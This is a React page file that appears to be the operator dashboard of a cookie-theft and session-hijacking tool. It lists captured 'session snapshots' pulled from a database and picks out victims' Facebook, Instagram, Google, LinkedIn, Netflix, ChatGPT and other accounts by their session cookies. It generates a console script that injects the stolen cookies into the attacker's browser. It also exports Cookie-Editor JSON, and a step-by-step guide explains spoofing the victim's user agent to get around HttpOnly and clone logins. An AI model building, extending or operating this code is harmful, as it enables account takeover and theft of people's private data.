"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
  domain: string;
}

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);

  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [copiedJson, setCopiedJson] = useState(false);
  const [showGuide, setShowGuide] = useState(false);

  useEffect(() => {
    fetchSessions();
    const timer = setInterval(() => fetchSessions(), 60000);
    return () => clearInterval(timer);
  }, []);

  const getHealthStatus = (sessionCookies: { name: string, expiration_date: number | null }[]): "active" | "expiring" | "expired" => {
    if (!sessionCookies || sessionCookies.length === 0) return "active";
    const now = Date.now() / 1000;
    const sessionCookie = sessionCookies.find(c => ["c_user", "ds_user_id", "auth_token", "SID", "NetflixId", "li_at", "LOGIN_INFO"].includes(c.name));
    if (!sessionCookie || !sessionCookie.expiration_date) return "active";
    if (sessionCookie.expiration_date < now) return "expired";
    if (sessionCookie.expiration_date < now + 604800) return "expiring";
    return "active";
  };

  const getPrimaryDomainFromCookies = (sessionCookies: { domain: string }[]): string => {
    if (sessionCookies.length === 0) return "unknown.com";
    
    const domainCounts: Record<string, number> = {};
    sessionCookies.forEach(c => {
      // Clean domain: Remove leading dot and convert to lowercase
      const d = c.domain.replace(/^\./, "").toLowerCase();
      // Ignore common noise domains
      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics") && !d.includes("pixel") && !d.includes("googletagmanager")) {
        domainCounts[d] = (domainCounts[d] || 0) + 1;
      }
    });

    const entries = Object.entries(domainCounts);
    if (entries.length === 0) return sessionCookies[0].domain.replace(/^\./, "");
    
    // Sort by frequency and return the top domain
    return entries.sort((a, b) => b[1] - a[1])[0][0];
  };

  const identifyAccount = (sessionCookies: { domain: string, name: string, value: string, expiration_date: number | null }[], fallbackId: string): AccountInfo => {
    const health = getHealthStatus(sessionCookies);
    const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
    const primaryDomain = getPrimaryDomainFromCookies(sessionCookies);
    
    // Platform detection logic
    if (domainStr.includes("facebook.com")) {
      const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
      return { platform: "Facebook", identifier: fbId || "Account", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
    }
    if (domainStr.includes("instagram.com")) {
      const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
      return { platform: "Instagram", identifier: igId || "Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
    }
    if (domainStr.includes("youtube.com") || domainStr.includes("google.com/youtube")) {
      return { platform: "YouTube", identifier: "YouTube Viewer", icon: Youtube, color: "text-red-500", health, domain: "youtube.com" };
    }
    if (domainStr.includes("grok.com") || domainStr.includes("x.com/i/grok")) {
      return { platform: "Grok AI", identifier: "AI Brain", icon: Bot, color: "text-purple-400", health, domain: "grok.com" };
    }
    if (domainStr.includes("linkedin.com")) {
      return { platform: "LinkedIn", identifier: "Professional Profile", icon: Linkedin, color: "text-blue-600", health, domain: "linkedin.com" };
    }
    if (domainStr.includes("mercadolibre.com")) {
      return { platform: "Mercado Libre", identifier: "Account", icon: ShoppingCart, color: "text-yellow-400", health, domain: "mercadolibre.com" };
    }
    if (domainStr.includes("gemini.google.com")) {
      return { platform: "Gemini", identifier: "LLM Session", icon: MessageSquare, color: "text-blue-300", health, domain: "gemini.google.com" };
    }
    if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
      return { platform: "ChatGPT", identifier: "AI Assistant", icon: Cpu, color: "text-emerald-400", health, domain: "chatgpt.com" };
    if (domainStr.includes("kick.com"))
      return { platform: "Kick", identifier: "Stream Session", icon: Gamepad2, color: "text-green-500", health, domain: "kick.com" };
    if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
      return { platform: "X / Twitter", identifier: "Social ID", icon: Twitter, color: "text-blue-400", health, domain: "x.com" };
    if (domainStr.includes("netflix.com"))
      return { platform: "Netflix", identifier: "Streaming User", icon: Play, color: "text-red-600", health, domain: "netflix.com" };
    if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
      return { platform: "Blackboard", identifier: "Academic Portal", icon: GraduationCap, color: "text-blue-400", health, domain: "blackboard.com" };
    if (domainStr.includes("google.com")) {
      const email = sessionCookies.find(c => c.name.includes("email"))?.value;
      return { platform: "Google", identifier: email || "Google User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
    }

    // Generic labeling for unknown platforms
    const capitalizedName = primaryDomain.split('.')[0].charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
    return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-blue-400", health, domain: primaryDomain };
  };

  const fetchSessions = async () => {
    setLoading(true);
    const { data: sessionData } = await supabase
      .from("session_snapshots")
      .select("*")
      .order("captured_at", { ascending: false })
      .limit(60); 
    
    if (sessionData) {
      const sessionIds = sessionData.map(s => s.id);
      
      // STAGE 1: Fetch key ID cookies for ALL sessions (Highly efficient)
      const { data: idCookies } = await supabase
        .from("cookies")
        .select("snapshot_id, domain, name, value, expiration_date")
        .in("snapshot_id", sessionIds)
        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.sessionid,name.eq.SID,name.eq.li_at,name.eq.LOGIN_INFO,name.eq.__Secure-1PSID,name.eq.x-session-id");
      
      // STAGE 2: Fetch general domains for sessions that STILL have no cookies
      const identifiedIds = new Set(idCookies?.map(c => c.snapshot_id) || []);
      const missingIds = sessionIds.filter(id => !identifiedIds.has(id));
      
      let allCookies = [...(idCookies || [])];
      
      if (missingIds.length > 0) {
          const { data: fallbackCookies } = await supabase
            .from("cookies")
            .select("snapshot_id, domain, name, value, expiration_date")
            .in("snapshot_id", missingIds)
            .limit(5000); // Fetch a sample of any cookie to get the domain
          if (fallbackCookies) allCookies = [...allCookies, ...fallbackCookies];
      }
      
      const newAccountMap: Record<string, AccountInfo> = {};
      sessionData.forEach(session => {
        const sessionCookies = allCookies.filter(c => c.snapshot_id === session.id);
        newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
      });
      setAccountMap(newAccountMap);
      setSessions(sessionData);
    }
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data } = await supabase
      .from("cookies")
      .select("*")
      .eq("snapshot_id", snapshotId)
      .limit(3000); 
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    setCopied(false);
    setCopiedJson(false);
    fetchCookies(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    return `(function() {
  const cookies = ${JSON.stringify(cookies)};
  console.clear();
  console.log('%c [SessionSafe] INICIANDO RESTAURACIÓN ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px; border-radius: 3px;');
  
  document.cookie.split(";").forEach(function(c) { 
    const name = c.split("=")[0].trim();
    const domain = location.hostname;
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + domain;
  });

  cookies.forEach(c => {
    try {
      // Cleaner domain injection logic
      const targetDomain = c.domain.startsWith(".") ? c.domain : ("." + c.domain);
      document.cookie = c.name + "=" + c.value + 
                    "; domain=" + targetDomain + 
                    "; path=" + (c.path || "/") + 
                    "; SameSite=Lax; Secure";
    } catch (e) {}
  });

  console.log('%c ¡CAPTURA COMPLETADA! Recargando... ', 'background: #10b981; color: #fff; font-weight: bold; padding: 5px;');
  setTimeout(() => location.reload(), 1500);
})();`;
  };

  const copyToClipboard = () => {
    const script = generateConsoleScript();
    if (!script) return;
    navigator.clipboard.writeText(script).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 5000);
    }).catch(() => prompt("Copia este código:", script));
  };

  const copyCookiesJson = () => {
    if (!selectedSession) return;
    
    // REVERSION: Export ALL cookies (No filter) to ensure login works 1:1
    // Keep it as simple as possible as it worked before
    const formatted = cookies.map(c => ({
      domain: c.domain.startsWith(".") ? c.domain : "." + c.domain,
      expirationDate: c.expiration_date ? Math.floor(c.expiration_date) : (Math.floor(Date.now() / 1000) + 86400 * 30),
      hostOnly: false,
      httpOnly: c.http_only,
      name: c.name,
      path: c.path || "/",
      sameSite: "no_restriction",
      secure: c.secure,
      session: c.is_session,
      storeId: c.store_id || "0",
      value: c.value
    }));
    
    const json = JSON.stringify(formatted, null, 2);
    navigator.clipboard.writeText(json).then(() => {
      setCopiedJson(true);
      setTimeout(() => setCopiedJson(false), 5000);
    });
  };

  const getDeviceIcon = (ua?: string) => {
    if (!ua) return Monitor;
    const lowerUA = ua.toLowerCase();
    if (lowerUA.includes("mobi") || lowerUA.includes("android") || lowerUA.includes("iphone")) return Smartphone;
    if (lowerUA.includes("tablet") || lowerUA.includes("ipad")) return Tablet;
    return Monitor;
  };

  const filteredSessions = sessions.filter(s => 
    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.domain.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="relative min-h-screen">
      <div className="space-y-8 max-w-7xl mx-auto pb-40 px-6">
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 py-8">
          <div>
            <h2 className="text-5xl font-black tracking-tighter bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 bg-clip-text text-transparent">
              Intelligence Dashboard
            </h2>
            <p className="text-gray-500 font-bold tracking-wide mt-1">OPERATIONAL SESSIONS: {sessions.length}</p>
          </div>
          
          <div className="flex items-center gap-4">
            <div className="glass flex items-center px-5 py-3 rounded-2xl border border-white/5 w-full md:w-80 shadow-2xl">
              <Search className="text-gray-500 mr-3" size={20} />
              <input 
                type="text" 
                placeholder="Locate platforms or domains..." 
                className="bg-transparent border-none outline-none text-sm w-full py-1 placeholder:text-gray-600 font-medium"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>
            <button onClick={() => {fetchSessions();}} className="glass p-3.5 rounded-2xl hover:bg-white/5 transition-all active:scale-95 border border-white/5 shadow-xl">
              <RefreshCw size={22} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
            </button>
            <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl text-blue-400 border border-blue-500/20 font-black text-xs uppercase tracking-widest shadow-xl hover:bg-blue-500/5 transition-all">
              <HelpCircle size={20} /> MANUAL
            </button>
          </div>
        </header>

        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-8">
            {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-56 glass rounded-[3rem] animate-pulse" />)}
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-8">
            {filteredSessions.map((session) => {
              const info = accountMap[session.id] || { platform: "External", identifier: "Active Session", icon: Shield, color: "text-blue-400", health: "active", domain: "unknown" };
              const UAIcon = getDeviceIcon(session.user_agent);
              
              return (
                <motion.div
                  key={session.id}
                  initial={{ opacity: 0, y: 30 }}
                  animate={{ opacity: 1, y: 0 }}
                  whileHover={{ y: -8, scale: 1.02 }}
                  onClick={() => handleSessionClick(session)}
                  className={`glass p-8 rounded-[3rem] cursor-pointer border-2 transition-all duration-500 ${selectedSession?.id === session.id ? "border-blue-500 bg-blue-500/10 shadow-3xl shadow-blue-500/20" : "border-white/5 hover:border-white/10 shadow-2xl"}`}
                >
                  <div className="flex items-start justify-between mb-6">
                    <div className={`p-5 rounded-3xl bg-black/40 shadow-inner border border-white/5 ${info.color}`}>
                      <info.icon size={32} strokeWidth={2.5} />
                    </div>
                    <div className="flex flex-col items-end gap-2">
                      <div className="glass-pill px-4 py-2 rounded-full text-[10px] font-black text-white/50 uppercase tracking-[0.2em] border border-white/5 shadow-sm">
                        {info.platform}
                      </div>
                      <div className={`text-[9px] font-black uppercase px-3 py-1.5 rounded-full flex items-center gap-1.5 shadow-md ${
                        info.health === "active" ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/20" : "bg-red-500/20 text-red-400 border border-red-500/20"
                      }`}>
                        <div className={`w-1.5 h-1.5 rounded-full ${info.health === "active" ? "bg-emerald-400 animate-pulse" : "bg-red-400"}`} />
                        {info.health}
                      </div>
                    </div>
                  </div>
                  <div className="space-y-1">
                    <div className="text-[11px] font-black text-blue-400/90 uppercase tracking-[0.15em] px-1 drop-shadow-md">
                      {info.domain}
                    </div>
                    <h4 className="font-black text-xl truncate text-white mb-2 leading-tight">{info.identifier}</h4>
                    <div className="flex items-center justify-between pt-2">
                      <div className="flex items-center gap-2 text-xs font-bold text-gray-500">
                        <Clock size={14} className="text-gray-600" />
                        {formatRelativeTime(session.captured_at)}
                      </div>
                      {session.user_agent && (
                        <div className="flex items-center gap-2 text-[10px] font-black text-blue-400/90 bg-blue-400/10 px-3 py-2 rounded-2xl border border-blue-400/20 uppercase tracking-tighter shadow-sm">
                          <UAIcon size={14} /> UA VERIFIED
                        </div>
                      )}
                    </div>
                  </div>
                </motion.div>
              );
            })}
          </div>
        )}

        {/* Global Manual Sidebar */}
        <AnimatePresence>
          {showGuide && (
            <motion.div 
              initial={{ opacity: 0, x: 400 }} 
              animate={{ opacity: 1, x: 0 }} 
              exit={{ opacity: 0, x: 400 }} 
              className="fixed top-28 right-10 w-96 z-[100]"
            >
              <GlassCard className="p-8 border-l-4 border-blue-500 bg-black/90 backdrop-blur-3xl rounded-[3rem] shadow-3xl">
                <div className="flex items-center justify-between mb-8">
                  <h5 className="font-black text-sm uppercase tracking-[0.3em] text-blue-400">Restoration Hub</h5>
                  <button onClick={() => setShowGuide(false)} className="p-2 hover:bg-white/10 rounded-2xl transition-colors"><X size={20} /></button>
                </div>
                <div className="space-y-8">
                  {[
                    { step: "01", title: "Emulate Environment", desc: "Copy the original User-Agent and apply it using 'User-Agent Switcher' extension." },
                    { step: "02", title: "Target Domain", desc: "Navigate to the site (e.g., instagram.com) to establish the context." },
                    { step: "03", title: "Deep Injection", desc: "Use the 'JSON Method' with 'Cookie-Editor' for full HttpOnly bypass." },
                    { step: "04", title: "Execute Restoration", desc: "Refresh the page. If the session persists, you have successfully mirrored the ID." }
                  ].map((item, idx) => (
                    <div key={idx} className="flex gap-6 items-start">
                      <div className="text-3xl font-black text-white/5 select-none">{item.step}</div>
                      <div>
                        <div className="text-xs font-black text-white/90 uppercase mb-2 tracking-widest">{item.title}</div>
                        <p className="text-xs text-gray-500 leading-relaxed font-medium">{item.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </GlassCard>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Floating Detail Overlay */}
        <AnimatePresence>
          {selectedSession && (
            <motion.div initial={{ opacity: 0, y: 100 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 100 }} className="fixed bottom-0 left-0 right-0 p-10 z-[110] pointer-events-none">
              <div className="max-w-6xl mx-auto pointer-events-auto">
                <GlassCard className="border-t-4 border-blue-500 shadow-[0_0_100px_rgba(37,99,235,0.2)] bg-black/98 backdrop-blur-3xl px-12 py-12 rounded-[4rem]">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                    <div className="space-y-8">
                      <div className="flex items-center gap-6">
                        <div className={`p-8 rounded-[2.5rem] bg-black/40 shadow-inner border border-white/5 ${accountMap[selectedSession.id]?.color}`}>
                          {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 72 })}
                        </div>
                        <div>
                          <h3 className="text-5xl font-black text-white leading-tight">{accountMap[selectedSession.id]?.platform}</h3>
                          <div className="flex items-center gap-3 text-gray-400 font-bold mt-2 uppercase text-[11px] tracking-[0.2em]">
                            <Clock size={16} className="text-blue-500" /> CAPTURED: {new Date(selectedSession.captured_at).toLocaleString()}
                          </div>
                          <div className="text-blue-400 font-black text-[10px] mt-1 tracking-widest uppercase">{accountMap[selectedSession.id]?.domain}</div>
                        </div>
                      </div>

                      <div className="p-6 rounded-[2.5rem] bg-blue-500/5 border border-blue-500/10 shadow-inner">
                        <div className="flex items-center justify-between mb-4">
                            <div className="flex items-center gap-3 text-blue-400 font-black text-[11px] uppercase tracking-[0.2em]">
                                <Monitor size={20} /> CRYPTOGRAPHIC SIGNATURE (UA)
                            </div>
                            {selectedSession.user_agent && <div className="text-[10px] font-black text-emerald-400">MATCH VALIDATED</div>}
                        </div>
                        {selectedSession.user_agent ? (
                          <div className="text-xs font-mono text-gray-500 break-all leading-relaxed bg-black/60 p-6 rounded-3xl border border-white/5 shadow-2xl">
                            {selectedSession.user_agent}
                          </div>
                        ) : (
                          <div className="flex flex-col items-center justify-center gap-4 p-8 bg-red-500/5 rounded-3xl border border-red-500/10 text-center">
                            <AlertCircle size={32} className="text-red-500/40" />
                            <p className="text-xs text-gray-500 font-bold max-w-[240px] uppercase tracking-wider">
                              Signature Missing. Reverting to standard Windows/Chrome headers is recommended.
                            </p>
                          </div>
                        )}
                      </div>
                    </div>

                    <div className="flex flex-col justify-center space-y-6">
                      <div className="flex flex-col gap-4">
                        <div className="flex items-center justify-between px-4 text-emerald-400 font-black text-xs uppercase tracking-[0.3em]">
                          <div className="flex items-center gap-3 animate-pulse"><Check size={22} /> RESTORE ARCHIVE ({cookies.length})</div>
                          {cookies.some(c => c.http_only) && (
                            <div className="flex items-center gap-2 text-amber-400 bg-amber-400/10 px-4 py-2 rounded-full border border-amber-500/20 shadow-lg shadow-amber-500/5">
                              <AlertCircle size={16} /> HTTPONLY ACTIVATED
                            </div>
                          )}
                        </div>
                        
                        <div className="flex flex-col gap-5">
                          <button 
                            onClick={copyToClipboard}
                            className={"w-full flex items-center justify-center gap-5 px-10 py-7 rounded-[2.5rem] font-black text-3xl shadow-3xl transition-all active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-500/40" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/40 border-t-2 border-white/20")}
                          >
                            {copied ? <><Check size={40} /> RESTORED</> : <><Copy size={40} className="group-hover:scale-110 transition-transform"/> CONSOLE BOOT</>}
                          </button>

                          <div className="flex gap-5">
                            <button 
                              onClick={copyCookiesJson}
                              className={"flex-1 flex items-center justify-center gap-4 p-6 rounded-[2rem] glass font-black text-sm uppercase tracking-widest transition-all " + (copiedJson ? "text-emerald-400 border-emerald-500/40 shadow-emerald-500/10" : "text-white/70 hover:bg-white/10 border-white/10 shadow-2xl")}
                            >
                              {copiedJson ? <><Check size={24} /> JSON PACKED</> : <><FileJson size={24} /> CLONE JSON (SAFE)</>}
                            </button>
                            <button onClick={() => setSelectedSession(null)} className="px-10 py-6 rounded-[2rem] glass font-black text-white/30 text-sm uppercase tracking-widest border-white/10 hover:text-white/60 transition-colors">
                              DISMISS
                            </button>
                          </div>
                        </div>
                      </div>
                      <div className="p-6 rounded-[2.5rem] bg-amber-500/5 border border-amber-500/20 flex gap-6 shadow-inner">
                         <div className="p-4 rounded-2xl bg-amber-500/10 h-fit text-amber-400 shadow-lg"><Info size={24} /></div>
                         <div>
                            <p className="text-xs text-amber-200/50 leading-relaxed font-bold uppercase tracking-wide mb-1">Security Alert</p>
                            <p className="text-[13px] text-amber-200/80 leading-relaxed font-medium">
                                Instagram and highly secured portals use **HttpOnly** session tokens. The console method will fail to set them. **Use the JSON button** and import via **Cookie-Editor** for a 1:1 session mirror.
                            </p>
                         </div>
                      </div>
                    </div>
                  </div>
                </GlassCard>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
